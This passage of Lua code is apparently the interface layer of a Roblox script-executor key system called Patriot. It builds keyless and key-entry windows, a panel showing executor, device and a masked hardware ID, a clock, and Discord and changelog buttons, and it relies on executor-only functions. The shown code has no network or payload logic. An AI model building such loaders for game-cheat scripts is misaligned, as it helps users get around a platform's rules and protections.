    welcomeLabel.Parent = contentFrame

    local divider1 = Instance.new("Frame")
    divider1.Size = UDim2.new(1, 16, 0, 1)
    divider1.Position = UDim2.new(0.5, 0, 0, 0)
    divider1.AnchorPoint = Vector2.new(0.5, 0)
    divider1.BackgroundColor3 = getDivider()
    divider1.BackgroundTransparency = 0.5
    divider1.BorderSizePixel = 0
    divider1.LayoutOrder = 3
    divider1.Parent = contentFrame

    local executorContainer = Instance.new("Frame")
    executorContainer.Size = UDim2.new(1, 0, 0, fieldHeight)
    executorContainer.BackgroundTransparency = 1
    executorContainer.LayoutOrder = 4
    executorContainer.Parent = contentFrame

    local executorTitle = Instance.new("TextLabel")
    executorTitle.Size = UDim2.new(1, 0, 0, 11)
    executorTitle.BackgroundTransparency = 1
    executorTitle.Text = "Executor"
    executorTitle.TextColor3 = getTextDim()
    executorTitle.TextSize = titleSize
    executorTitle.Font = Enum.Font.ArimoBold
    executorTitle.TextXAlignment = Enum.TextXAlignment.Left
    executorTitle.Parent = executorContainer

    local executorValue = Instance.new("TextLabel")
    executorValue.Size = UDim2.new(1, 0, 0, 14)
    executorValue.Position = UDim2.new(0, 0, 0, 11)
    executorValue.BackgroundTransparency = 1
    executorValue.Text = getExecutorName()
    executorValue.TextColor3 = getAccent()
    executorValue.TextSize = valueSize
    executorValue.Font = Enum.Font.ArimoBold
    executorValue.TextXAlignment = Enum.TextXAlignment.Left
    executorValue.TextTruncate = Enum.TextTruncate.AtEnd
    executorValue.Parent = executorContainer

    local deviceContainer = Instance.new("Frame")
    deviceContainer.Size = UDim2.new(1, 0, 0, fieldHeight)
    deviceContainer.BackgroundTransparency = 1
    deviceContainer.LayoutOrder = 5
    deviceContainer.Parent = contentFrame

    local deviceTitle = Instance.new("TextLabel")
    deviceTitle.Size = UDim2.new(1, 0, 0, 11)
    deviceTitle.BackgroundTransparency = 1
    deviceTitle.Text = "Device"
    deviceTitle.TextColor3 = getTextDim()
    deviceTitle.TextSize = titleSize
    deviceTitle.Font = Enum.Font.ArimoBold
    deviceTitle.TextXAlignment = Enum.TextXAlignment.Left
    deviceTitle.Parent = deviceContainer

    local deviceValue = Instance.new("TextLabel")
    deviceValue.Size = UDim2.new(1, 0, 0, 14)
    deviceValue.Position = UDim2.new(0, 0, 0, 11)
    deviceValue.BackgroundTransparency = 1
    deviceValue.Text = getDeviceType()
    deviceValue.TextColor3 = getAccent()
    deviceValue.TextSize = valueSize
    deviceValue.Font = Enum.Font.ArimoBold
    deviceValue.TextXAlignment = Enum.TextXAlignment.Left
    deviceValue.TextTruncate = Enum.TextTruncate.AtEnd
    deviceValue.Parent = deviceContainer

    local divider2 = Instance.new("Frame")
    divider2.Size = UDim2.new(1, 16, 0, 1)
    divider2.Position = UDim2.new(0.5, 0, 0, 0)
    divider2.AnchorPoint = Vector2.new(0.5, 0)
    divider2.BackgroundColor3 = getDivider()
    divider2.BackgroundTransparency = 0.5
    divider2.BorderSizePixel = 0
    divider2.LayoutOrder = 6
    divider2.Parent = contentFrame

    local hwidContainer = Instance.new("Frame")
    hwidContainer.Size = UDim2.new(1, 0, 0, fieldHeight)
    hwidContainer.BackgroundTransparency = 1
    hwidContainer.LayoutOrder = 7
    hwidContainer.Parent = contentFrame

    local hwidTitle = Instance.new("TextLabel")
    hwidTitle.Size = UDim2.new(1, 0, 0, 11)
    hwidTitle.BackgroundTransparency = 1
    hwidTitle.Text = "HWID"
    hwidTitle.TextColor3 = getTextDim()
    hwidTitle.TextSize = titleSize
    hwidTitle.Font = Enum.Font.ArimoBold
    hwidTitle.TextXAlignment = Enum.TextXAlignment.Left
    hwidTitle.Parent = hwidContainer

    local fullHWID = getHWID()
    local copyBtnSize = 18
    local dotAreaWidth = panelWidth - 16 - copyBtnSize - 6
    local hiddenDots = generateHiddenDots(dotAreaWidth, 5)

    local hwidValue = Instance.new("TextLabel")
    hwidValue.Size = UDim2.new(1, -(copyBtnSize + 6), 0, 14)
    hwidValue.Position = UDim2.new(0, 0, 0, 11)
    hwidValue.BackgroundTransparency = 1
    hwidValue.Text = hiddenDots
    hwidValue.TextColor3 = getTextDim()
    hwidValue.TextSize = isCompact and 9 or 10
    hwidValue.Font = Enum.Font.ArimoBold
    hwidValue.TextXAlignment = Enum.TextXAlignment.Left
    hwidValue.TextTruncate = Enum.TextTruncate.AtEnd
    hwidValue.Parent = hwidContainer

    local copyBtn = Instance.new("ImageButton")
    copyBtn.Size = UDim2.new(0, copyBtnSize, 0, copyBtnSize)
    copyBtn.Position = UDim2.new(1, 0, 0.5, 1)
    copyBtn.AnchorPoint = Vector2.new(1, 0.5)
    copyBtn.BackgroundTransparency = 1
    copyBtn.Image = getIcon("copy")
    copyBtn.ImageColor3 = getTextDim()
    copyBtn.ScaleType = Enum.ScaleType.Fit
    copyBtn.Parent = hwidContainer
    copyBtn.MouseEnter:Connect(function() TweenService:Create(copyBtn, TweenInfo.new(0.15), {ImageColor3 = getAccent()}):Play() end)
    copyBtn.MouseLeave:Connect(function() TweenService:Create(copyBtn, TweenInfo.new(0.15), {ImageColor3 = getTextDim()}):Play() end)
    copyBtn.MouseButton1Click:Connect(function()
        pcall(function() setclipboard(fullHWID) end)
        TweenService:Create(copyBtn, TweenInfo.new(0.1), {ImageColor3 = getSuccess()}):Play()
        task.delay(0.3, function() TweenService:Create(copyBtn, TweenInfo.new(0.15), {ImageColor3 = getTextDim()}):Play() end)
        Patriot:Notify("Copied", "HWID copied to clipboard", 2, "copy")
    end)

    local divider3 = Instance.new("Frame")
    divider3.Size = UDim2.new(1, 16, 0, 1)
    divider3.Position = UDim2.new(0.5, 0, 0, 0)
    divider3.AnchorPoint = Vector2.new(0.5, 0)
    divider3.BackgroundColor3 = getDivider()
    divider3.BackgroundTransparency = 0.5
    divider3.BorderSizePixel = 0
    divider3.LayoutOrder = 8
    divider3.Parent = contentFrame

    local clockContainer = Instance.new("Frame")
    clockContainer.Size = UDim2.new(1, 0, 0, isCompact and 30 or 38)
    clockContainer.BackgroundTransparency = 1
    clockContainer.LayoutOrder = 9
    clockContainer.Parent = contentFrame

    local clockRow = Instance.new("Frame")
    clockRow.Size = UDim2.new(1, 0, 0, isCompact and 18 or 22)
    clockRow.Position = UDim2.new(0.5, -8, 0, 0)
    clockRow.AnchorPoint = Vector2.new(0.5, 0)
    clockRow.BackgroundTransparency = 1
    clockRow.Parent = clockContainer

    local clockRowLayout = Instance.new("UIListLayout", clockRow)
    clockRowLayout.FillDirection = Enum.FillDirection.Horizontal
    clockRowLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    clockRowLayout.VerticalAlignment = Enum.VerticalAlignment.Center
    clockRowLayout.Padding = UDim.new(0, isCompact and 4 or 6)

    local clockIcon = Instance.new("ImageLabel")
    clockIcon.Size = UDim2.new(0, isCompact and 14 or 16, 0, isCompact and 14 or 16)
    clockIcon.BackgroundTransparency = 1
    clockIcon.Image = getIcon("clock")
    clockIcon.ImageColor3 = getAccent()
    clockIcon.ScaleType = Enum.ScaleType.Fit
    clockIcon.LayoutOrder = 1
    clockIcon.Parent = clockRow

    local clockTimeLabel = Instance.new("TextLabel")
    clockTimeLabel.Size = UDim2.new(0, 0, 1, 0)
    clockTimeLabel.AutomaticSize = Enum.AutomaticSize.X
    clockTimeLabel.BackgroundTransparency = 1
    clockTimeLabel.Text = formatTime12()
    clockTimeLabel.TextColor3 = getAccent()
    clockTimeLabel.TextSize = isCompact and 14 or 16
    clockTimeLabel.Font = Enum.Font.ArimoBold
    clockTimeLabel.LayoutOrder = 2
    clockTimeLabel.Parent = clockRow

    local clockDateLabel = Instance.new("TextLabel")
    clockDateLabel.Size = UDim2.new(1, 0, 0, isCompact and 12 or 14)
    clockDateLabel.Position = UDim2.new(0, -8, 0, isCompact and 18 or 22)
    clockDateLabel.BackgroundTransparency = 1
    clockDateLabel.Text = formatDate()
    clockDateLabel.TextColor3 = getTextDim()
    clockDateLabel.TextSize = isCompact and 9 or 11
    clockDateLabel.Font = Enum.Font.ArimoBold
    clockDateLabel.TextXAlignment = Enum.TextXAlignment.Center
    clockDateLabel.Parent = clockContainer

    local clockRunning = true
    task.spawn(function()
        while clockRunning do
            if not clockTimeLabel or not clockTimeLabel.Parent then clockRunning = false break end
            clockTimeLabel.Text = formatTime12()
            clockDateLabel.Text = formatDate()
            task.wait(1)
        end
    end)
    panel.Destroying:Connect(function() clockRunning = false end)

    createFlowingBorder(panel, 8, 1, 0.3)

    local function toggle(userIcon, container, baseWidth)
        isOpen = not isOpen
        if isOpen then
            TweenService:Create(panelStroke, TweenInfo.new(0.2), {Transparency = 0.3}):Play()
            TweenService:Create(panel, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.new(0, panelWidth, 0, panelHeight)}):Play()
            TweenService:Create(container, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.new(0, baseWidth + gap + panelWidth, 0, panelHeight)}):Play()
        else
            TweenService:Create(panelStroke, TweenInfo.new(0.2), {Transparency = 1}):Play()
            TweenService:Create(panel, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, panelHeight)}):Play()
            TweenService:Create(container, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Size = UDim2.new(0, baseWidth, 0, panelHeight)}):Play()
        end
    end

    panelClose.MouseButton1Click:Connect(function() if isOpen then toggle(nil, parent, windowWidth) end end)
    return panel, toggle, function() return isOpen end, panelWidth
end

-- Enhanced Centered UI Builder
local function BuildCenteredUI(windowWidth, windowHeight, panelHeight, userPanelWidth, changelogPanelWidth, gap, buildContent)
    local gui = buildContent.gui

    local container = Instance.new("Frame")
    container.Name = "Container"
    container.Size = UDim2.new(0, windowWidth, 0, panelHeight)
    container.Position = UDim2.new(0.5, 0, 1.5, 0)
    container.AnchorPoint = Vector2.new(0.5, 0.5)
    container.BackgroundTransparency = 1
    container.Parent = gui

    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Size = UDim2.new(0, windowWidth, 0, windowHeight)
    mainFrame.Position = UDim2.new(0.5, 0, 0, 0)
    mainFrame.AnchorPoint = Vector2.new(0.5, 0)
    mainFrame.BackgroundColor3 = getBackground()
    mainFrame.BackgroundTransparency = 0.85
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = container
    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)

    local mainGradient = Instance.new("UIGradient", mainFrame)
    mainGradient.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0.1),
        NumberSequenceKeypoint.new(0.5, 0),
        NumberSequenceKeypoint.new(1, 0.1)
    })
    mainGradient.Rotation = 135

    local mainStroke = Instance.new("UIStroke", mainFrame)
    mainStroke.Color = getAccent()
    mainStroke.Thickness = 1
    mainStroke.Transparency = 0.4

    createFlowingBorder(mainFrame, 12, 2, 0.6)

    local userPanel, toggleUserPanel, isUserOpen, userPanelActualWidth = CreateUserInfoPanel(container, windowWidth, panelHeight, userPanelWidth, mainFrame, gap, false)
    local changelogPanel, toggleChangelog, isChangelogOpen, changelogPanelActualWidth = CreateChangelogPanel(container, windowWidth, panelHeight, changelogPanelWidth, mainFrame, gap)

    local function getContainerWidth()
        local w = windowWidth
        if isUserOpen() then w = w + gap + userPanelActualWidth end
        if isChangelogOpen() then w = w + gap + changelogPanelActualWidth end
        return w
    end

    local function toggleUser(userIcon)
        local currentW = getContainerWidth()
        if isUserOpen() then
            toggleUserPanel(userIcon, container, currentW - gap - userPanelActualWidth)
        else
            toggleUserPanel(userIcon, container, currentW)
        end
    end

    local function toggleCL(changelogIcon)
        local currentW = getContainerWidth()
        if isChangelogOpen() then
            toggleChangelog(changelogIcon, container, currentW - gap - changelogPanelActualWidth)
        else
            toggleChangelog(changelogIcon, container, currentW)
        end
    end

    local function closeAllPanels(userIcon, changelogIcon, callback)
        if isChangelogOpen() then toggleCL(changelogIcon) task.wait(0.35) end
        if isUserOpen() then toggleUser(userIcon) task.wait(0.35) end
        if callback then callback() end
    end

    return {
        container = container,
        mainFrame = mainFrame,
        mainStroke = mainStroke,
        toggleUser = toggleUser,
        toggleCL = toggleCL,
        isUserOpen = isUserOpen,
        isChangelogOpen = isChangelogOpen,
        closeAllPanels = closeAllPanels
    }
end

local function handleKeylessSkip()
    getgenv().SCRIPT_KEY = "KEYLESS"
    getgenv().PatriotLoaded = false
    Patriot:Notify("Access Granted", "Keyless access approved!", 3, "success")
    task.wait(0.3)
    if Patriot.Callbacks.OnSuccess then Patriot.Callbacks.OnSuccess() end
end

-- Enhanced Keyless UI
local function BuildKeylessUI()
    local oldGui = hui:FindFirstChild("PatriotKeylessSystem")
    if oldGui then oldGui:Destroy() end
    local oldGui2 = hui:FindFirstChild("PatriotKeySystem")
    if oldGui2 then oldGui2:Destroy() end

    enableBlur()

    local mobile = isMobile()
    local padding = 14
    local windowWidth = 320
    local windowHeight = 280
    local userPanelWidth = 165
    local changelogPanelWidth = 200
    local gap = 12

    local gui = Instance.new("ScreenGui")
    gui.Name = "PatriotKeylessSystem"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.Parent = hui

    local ui = BuildCenteredUI(windowWidth, windowHeight, windowHeight, userPanelWidth, changelogPanelWidth, gap, {gui = gui})
    local container = ui.container
    local main = ui.mainFrame
    local mainStroke = ui.mainStroke

    local header = Instance.new("Frame")
    header.Size = UDim2.new(1, 0, 0, 50)
    header.BackgroundColor3 = getHeader()
    header.BackgroundTransparency = 0.85
    header.BorderSizePixel = 0
    header.Active = true
    header.Parent = main
    Instance.new("UICorner", header).CornerRadius = UDim.new(0, 12)

    local headerFix = Instance.new("Frame")
    headerFix.Size = UDim2.new(1, 0, 0, 8)
    headerFix.Position = UDim2.new(0, 0, 1, -8)
    headerFix.BackgroundColor3 = getHeader()
    headerFix.BackgroundTransparency = 0.85
    headerFix.BorderSizePixel = 0
    headerFix.Parent = header

    local headerLine = Instance.new("Frame")
    headerLine.Size = UDim2.new(1, 0, 0, 1)
    headerLine.Position = UDim2.new(0, 0, 1, 0)
    headerLine.BackgroundColor3 = getAccent()
    headerLine.BackgroundTransparency = 0.4
    headerLine.BorderSizePixel = 0
    headerLine.Parent = header

    local logo = Instance.new("ImageLabel")
    logo.Size = UDim2.new(0, 30, 0, 30)
    logo.Position = UDim2.new(0, padding, 0.5, 0)
    logo.AnchorPoint = Vector2.new(0, 0.5)
    logo.BackgroundTransparency = 1
    logo.Image = getLogoIcon()
    logo.ImageColor3 = getText()
    logo.ScaleType = Enum.ScaleType.Fit
    logo.Parent = header

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, -90, 1, 0)
    title.Position = UDim2.new(0, padding + 40, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = Patriot.Appearance.Title
    title.TextColor3 = getText()
    title.TextSize = mobile and 24 or 26
    title.Font = Enum.Font.ArimoBold
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = header

    local closeBtn = Instance.new("ImageButton")
    closeBtn.Size = UDim2.new(0, 22, 0, 22)
    closeBtn.Position = UDim2.new(1, -padding, 0.5, 0)
    closeBtn.AnchorPoint = Vector2.new(1, 0.5)
    closeBtn.BackgroundTransparency = 1
    closeBtn.Image = getIcon("close")
    closeBtn.ImageColor3 = getTextDim()
    closeBtn.ScaleType = Enum.ScaleType.Fit
    closeBtn.Parent = header
    closeBtn.MouseEnter:Connect(function() TweenService:Create(closeBtn, TweenInfo.new(0.15), {ImageColor3 = getError()}):Play() end)
    closeBtn.MouseLeave:Connect(function() TweenService:Create(closeBtn, TweenInfo.new(0.15), {ImageColor3 = getTextDim()}):Play() end)

    local contentY = 60

    local successBox = Instance.new("Frame")
    successBox.Size = UDim2.new(0.94, 0, 0, 52)
    successBox.Position = UDim2.new(0.5, 0, 0, contentY)
    successBox.AnchorPoint = Vector2.new(0.5, 0)
    successBox.BackgroundColor3 = getSuccess()
    successBox.BackgroundTransparency = 0.85
    successBox.BorderSizePixel = 0
    successBox.Parent = main
    Instance.new("UICorner", successBox).CornerRadius = UDim.new(0, 8)

    local successStroke = Instance.new("UIStroke", successBox)
    successStroke.Color = getSuccess()
    successStroke.Thickness = 1
    successStroke.Transparency = 0.4

    local checkIcon = Instance.new("ImageLabel")
    checkIcon.Size = UDim2.new(0, 24, 0, 24)
    checkIcon.Position = UDim2.new(0, 16, 0.5, 0)
    checkIcon.AnchorPoint = Vector2.new(0, 0.5)
    checkIcon.BackgroundTransparency = 1
    checkIcon.Image = getIcon("check")
    checkIcon.ImageColor3 = getSuccess()
    checkIcon.ScaleType = Enum.ScaleType.Fit
    checkIcon.Parent = successBox

    local successText = Instance.new("TextLabel")
    successText.Size = UDim2.new(1, -60, 1, 0)
    successText.Position = UDim2.new(0, 52, 0, 0)
    successText.BackgroundTransparency = 1
    successText.Text = "Access Granted"
    successText.TextColor3 = getSuccess()
    successText.TextSize = mobile and 17 or 18
    successText.Font = Enum.Font.ArimoBold
    successText.TextXAlignment = Enum.TextXAlignment.Left
    successText.Parent = successBox

    local keylessText = Instance.new("TextLabel")
    keylessText.Size = UDim2.new(1, 0, 0, 20)
    keylessText.Position = UDim2.new(0.5, 0, 0, contentY + 60)
    keylessText.AnchorPoint = Vector2.new(0.5, 0)
    keylessText.BackgroundTransparency = 1
    keylessText.Text = "Keyless Script"
    keylessText.TextColor3 = getTextDim()
    keylessText.TextSize = mobile and 14 or 15
    keylessText.Font = Enum.Font.ArimoBold
    keylessText.Parent = main

    local divider = Instance.new("Frame")
    divider.Size = UDim2.new(1, 0, 0, 2)
    divider.Position = UDim2.new(0, 0, 0, contentY + 88)
    divider.BackgroundColor3 = getDivider()
    divider.BackgroundTransparency = 0.5
    divider.BorderSizePixel = 0
    divider.Parent = main

    local launchBtn = createEnhancedButton("Launch Script", "shield", true, main, contentY + 103, 0.75)

    local bottomY = contentY + 153

    local userBtn = Instance.new("TextButton")
    userBtn.Size = UDim2.new(0, 36, 0, 36)
    userBtn.Position = UDim2.new(0.5, -44, 0, bottomY)
    userBtn.AnchorPoint = Vector2.new(0.5, 0)
    userBtn.BackgroundColor3 = getBackground()
    userBtn.BackgroundTransparency = 0.85
    userBtn.BorderSizePixel = 0
    userBtn.Text = ""
    userBtn.AutoButtonColor = false
    userBtn.Parent = main
    Instance.new("UICorner", userBtn).CornerRadius = UDim.new(0, 8)

    local userIcon = Instance.new("ImageLabel")
    userIcon.Size = UDim2.new(0, 18, 0, 18)
    userIcon.Position = UDim2.new(0.5, 0, 0.5, 0)
    userIcon.AnchorPoint = Vector2.new(0.5, 0.5)
    userIcon.BackgroundTransparency = 1
    userIcon.Image = getIcon("user")
    userIcon.ImageColor3 = getTextDim()
    userIcon.ScaleType = Enum.ScaleType.Fit
    userIcon.Parent = userBtn
    userBtn.MouseEnter:Connect(function() TweenService:Create(userIcon, TweenInfo.new(0.15), {ImageColor3 = getAccent()}):Play() end)
    userBtn.MouseLeave:Connect(function() TweenService:Create(userIcon, TweenInfo.new(0.15), {ImageColor3 = getTextDim()}):Play() end)

    local discordBtn = Instance.new("TextButton")
    discordBtn.Size = UDim2.new(0, 36, 0, 36)
    discordBtn.Position = UDim2.new(0.5, 0, 0, bottomY)
    discordBtn.AnchorPoint = Vector2.new(0.5, 0)
    discordBtn.BackgroundColor3 = getBackground()
    discordBtn.BackgroundTransparency = 0.85
    discordBtn.BorderSizePixel = 0
    discordBtn.Text = ""
    discordBtn.AutoButtonColor = false
    discordBtn.Parent = main
    Instance.new("UICorner", discordBtn).CornerRadius = UDim.new(0, 8)

    local discordIcon = Instance.new("ImageLabel")
    discordIcon.Size = UDim2.new(0, 18, 0, 18)
    discordIcon.Position = UDim2.new(0.5, 0, 0.5, 0)
    discordIcon.AnchorPoint = Vector2.new(0.5, 0.5)
    discordIcon.BackgroundTransparency = 1
    discordIcon.Image = getIcon("discord")
    discordIcon.ImageColor3 = getDiscord()
    discordIcon.ScaleType = Enum.ScaleType.Fit
    discordIcon.Parent = discordBtn
    discordBtn.MouseEnter:Connect(function() TweenService:Create(discordIcon, TweenInfo.new(0.15), {ImageColor3 = getDiscordHover()}):Play() end)
    discordBtn.MouseLeave:Connect(function() TweenService:Create(discordIcon, TweenInfo.new(0.15), {ImageColor3 = getDiscord()}):Play() end)

    local changelogBtn = Instance.new("TextButton")
    changelogBtn.Size = UDim2.new(0, 36, 0, 36)
    changelogBtn.Position = UDim2.new(0.5, 44, 0, bottomY)
    changelogBtn.AnchorPoint = Vector2.new(0.5, 0)
    changelogBtn.BackgroundColor3 = getBackground()
    changelogBtn.BackgroundTransparency = 0.85
    changelogBtn.BorderSizePixel = 0
    changelogBtn.Text = ""
    changelogBtn.AutoButtonColor = false
    changelogBtn.Parent = main
    Instance.new("UICorner", changelogBtn).CornerRadius = UDim.new(0, 8)

    local changelogIcon = Instance.new("ImageLabel")
    changelogIcon.Size = UDim2.new(0, 18, 0, 18)
    changelogIcon.Position = UDim2.new(0.5, 0, 0.5, 0)
    changelogIcon.AnchorPoint = Vector2.new(0.5, 0.5)
    changelogIcon.BackgroundTransparency = 1
    changelogIcon.Image = getIcon("changelog")
    changelogIcon.ImageColor3 = getTextDim()
    changelogIcon.ScaleType = Enum.ScaleType.Fit
    changelogIcon.Parent = changelogBtn
    changelogBtn.MouseEnter:Connect(function() TweenService:Create(changelogIcon, TweenInfo.new(0.15), {ImageColor3 = getText()}):Play() end)
    changelogBtn.MouseLeave:Connect(function() TweenService:Create(changelogIcon, TweenInfo.new(0.15), {ImageColor3 = getTextDim()}):Play() end)

    if #Patriot.Changelog == 0 then
        changelogBtn.Visible = false
        userBtn.Position = UDim2.new(0.5, -22, 0, bottomY)
        discordBtn.Position = UDim2.new(0.5, 22, 0, bottomY)
    end

    local doors = CreateDoorOverlay(main, windowWidth, windowHeight)

    userBtn.MouseButton1Click:Connect(function() ui.toggleUser(userIcon) end)
    changelogBtn.MouseButton1Click:Connect(function() ui.toggleCL(changelogIcon) end)

    local function closeDoorsThenExit(callback)
        ui.closeAllPanels(userIcon, changelogIcon, function()
            doors.close(function() task.wait(0.3) if callback then callback() end end)
        end)
    end

    closeBtn.MouseButton1Click:Connect(function()
        Patriot:Notify("Goodbye", "See you next time!", 2, "close")
        closeDoorsThenExit(function()
            fullCleanup()
            TweenService:Create(container, TweenInfo.new(0.4, Enum.EasingStyle.Quart), {Position = UDim2.new(0.5, 0, -0.5, 0)}):Play()
            TweenService:Create(main, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
            TweenService:Create(mainStroke, TweenInfo.new(0.3), {Transparency = 1}):Play()
            task.wait(0.4) gui:Destroy()
        end)
        if Patriot.Callbacks.OnClose then Patriot.Callbacks.OnClose() end
    end)

    launchBtn.MouseButton1Click:Connect(function()
        Patriot:Notify("Launching", "Script loaded successfully!", 2, "success")
        getgenv().SCRIPT_KEY = "KEYLESS"
        getgenv().PatriotLoaded = false
        closeDoorsThenExit(function()
            disableBlur()
            TweenService:Create(container, TweenInfo.new(0.4, Enum.EasingStyle.Quart), {Position = UDim2.new(0.5, 0, -0.5, 0)}):Play()
            TweenService:Create(main, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
            TweenService:Create(mainStroke, TweenInfo.new(0.3), {Transparency = 1}):Play()
            task.wait(0.4) gui:Destroy()
            if not Internal.IsJunkieMode and not Internal.IsWilkinsMode and Patriot.Callbacks.OnSuccess then Patriot.Callbacks.OnSuccess() end
        end)
    end)

    discordBtn.MouseButton1Click:Connect(function()
        if Patriot.Links.Discord ~= "" then
            Patriot:Notify("Discord", "Invite link copied!", 2, "discord")
            pcall(function() setclipboard(Patriot.Links.Discord) end)
        end
    end)

    setupDragging(header, container)
    TweenService:Create(container, TweenInfo.new(0.5, Enum.EasingStyle.Quart), {Position = UDim2.new(0.5, 0, 0.45, 0)}):Play()
    task.wait(0.6)
    doors.open(function()
        checkIcon.Size = UDim2.new(0, 0, 0, 0)
        TweenService:Create(checkIcon, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.new(0, 24, 0, 24)}):Play()
        task.wait(0.2)
        ui.toggleUser(userIcon)
        if #Patriot.Changelog > 0 then task.wait(0.3) ui.toggleCL(changelogIcon) end
    end)
end

-- Enhanced Key UI
local function BuildKeyUI()
    local oldGui = hui:FindFirstChild("PatriotKeySystem")
    if oldGui then oldGui:Destroy() end
    local oldGui2 = hui:FindFirstChild("PatriotKeylessSystem")
    if oldGui2 then oldGui2:Destroy() end

    enableBlur()

    local mobile = isMobile()
    local scale = getScale()
    local padding = 14
    local showShop = isShopEnabled()
    local shopHeight = 52
    local shopDividerHeight = 1
    local shopExtra = showShop and (shopHeight + shopDividerHeight) or 0
    local baseWindowHeight = mobile and math.clamp(360 * scale, 320, 400) or 360
    local windowWidth = mobile and math.clamp(420 * scale, 360, 460) or 420
    local windowHeight = baseWindowHeight + shopExtra
    local elementHeight = mobile and math.clamp(56 * scale, 48, 62) or 56
    local buttonHeight = mobile and math.clamp(42 * scale, 38, 48) or 42
    local statusHeight = mobile and math.clamp(60 * scale, 52, 68) or 60
    local userPanelWidth = 180
    local changelogPanelWidth = 220
    local gap = 12

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "PatriotKeySystem"
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.Parent = hui

    local ui = BuildCenteredUI(windowWidth, windowHeight, baseWindowHeight, userPanelWidth, changelogPanelWidth, gap, {gui = screenGui})
    local container = ui.container
    local mainFrame = ui.mainFrame
    local mainStroke = ui.mainStroke

    local header = Instance.new("Frame")
    header.Size = UDim2.new(1, 0, 0, 50)
    header.BackgroundColor3 = getHeader()
    header.BackgroundTransparency = 0.85
    header.BorderSizePixel = 0
    header.Active = true
    header.Parent = mainFrame
    Instance.new("UICorner", header).CornerRadius = UDim.new(0, 12)

    local headerFix = Instance.new("Frame")
    headerFix.Size = UDim2.new(1, 0, 0, 6)
    headerFix.Position = UDim2.new(0, 0, 1, -6)
    headerFix.BackgroundColor3 = getHeader()
    headerFix.BackgroundTransparency = 0.85
    headerFix.BorderSizePixel = 0
    headerFix.Parent = header

    local headerLine = Instance.new("Frame")
    headerLine.Size = UDim2.new(1, 0, 0, 1)
    headerLine.Position = UDim2.new(0, 0, 1, 0)
    headerLine.BackgroundColor3 = getAccent()
    headerLine.BackgroundTransparency = 0.4
    headerLine.BorderSizePixel = 0
    headerLine.Parent = header

    local logo = Instance.new("ImageLabel")
    logo.Size = Patriot.Appearance.IconSize
    logo.Position = UDim2.new(0, padding, 0.5, 0)
    logo.AnchorPoint = Vector2.new(0, 0.5)
    logo.BackgroundTransparency = 1
    logo.Image = getLogoIcon()
    logo.ImageColor3 = getText()
    logo.ScaleType = Enum.ScaleType.Fit
    logo.Parent = header

    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1, -90, 1, 0)
    titleLabel.Position = UDim2.new(0, padding + Patriot.Appearance.IconSize.X.Offset + 10, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = Patriot.Appearance.Title
    titleLabel.TextColor3 = getText()
    titleLabel.TextSize = mobile and 24 or 26
    titleLabel.Font = Enum.Font.ArimoBold
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.Parent = header

    local closeBtn = Instance.new("ImageButton")
    closeBtn.Size = UDim2.new(0, 22, 0, 22)
    closeBtn.Position = UDim2.new(1, -padding, 0.5, 0)
    closeBtn.AnchorPoint = Vector2.new(1, 0.5)
    closeBtn.BackgroundTransparency = 1
    closeBtn.Image = getIcon("close")
    closeBtn.ImageColor3 = getTextDim()
    closeBtn.ScaleType = Enum.ScaleType.Fit
    closeBtn.Parent = header
    closeBtn.MouseEnter:Connect(function() TweenService:Create(closeBtn, TweenInfo.new(0.15), {ImageColor3 = getError()}):Play() end)
    closeBtn.MouseLeave:Connect(function() TweenService:Create(closeBtn, TweenInfo.new(0.15), {ImageColor3 = getTextDim()}):Play() end)

    local contentStartY = 60

    local statusFrame, statusIcon, statusLabel, statusPulse = createEnhancedStatusFrame(mainFrame, contentStartY, Patriot.Appearance.Subtitle, "lock")
    statusPulse()

    local inputStartY = contentStartY + statusHeight + 10

    local textBox, inputFrame = createEnhancedInput(mainFrame, inputStartY, 0.94, "Enter your key...")

    local dividerY = inputStartY + elementHeight + 12

    local dividerLine = Instance.new("Frame")
    dividerLine.Size = UDim2.new(1, 0, 0, 2)
    dividerLine.Position = UDim2.new(0, 0, 0, dividerY)
    dividerLine.BackgroundColor3 = getDivider()
    dividerLine.BackgroundTransparency = 0.5
    dividerLine.BorderSizePixel = 0
    dividerLine.Parent = mainFrame

    local acquireStartY = dividerY + 15

    local acquireBtn = createEnhancedButton("Get Key", "user", false, mainFrame, acquireStartY, 0.75)
    local redeemBtn = createEnhancedButton("Verify Key", "shield", true, mainFrame, acquireStartY + buttonHeight + 5, 0.75)
    local bottomY = acquireStartY + buttonHeight * 2 + 10

    local userBtn = Instance.new("TextButton")
    userBtn.Size = UDim2.new(0, 36, 0, 36)
    userBtn.Position = UDim2.new(0.5, -44, 0, bottomY)
    userBtn.AnchorPoint = Vector2.new(0.5, 0)
    userBtn.BackgroundColor3 = getBackground()
    userBtn.BackgroundTransparency = 0.85
    userBtn.BorderSizePixel = 0
    userBtn.Text = ""
    userBtn.AutoButtonColor = false
    userBtn.Parent = mainFrame
    Instance.new("UICorner", userBtn).CornerRadius = UDim.new(0, 8)

    local userIcon = Instance.new("ImageLabel")
    userIcon.Size = UDim2.new(0, 18, 0, 18)
